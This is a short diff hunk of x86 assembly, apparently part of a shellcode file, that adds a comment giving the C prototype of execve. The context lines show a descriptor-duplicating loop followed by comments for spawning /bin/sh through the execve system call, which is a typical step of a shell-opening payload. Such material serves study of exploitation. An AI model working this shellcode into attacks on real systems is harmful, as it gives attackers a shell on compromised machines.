@@ -94,6 +94,7 @@ dec ecx			      ; decrement the loop counter
 jns stdloop		    ; loop as long sign flag is not set
 
 ;execute shell (here we use /bin/sh) using execve call
+;int execve(const char *filename, char *const argv[], char *const envp[]);
 ;execve("//bin/sh",["//bin/sh"])
 ; eax=0x0b, ebx=(pointer to the kernel instruction), ecx=0, edx=0
 
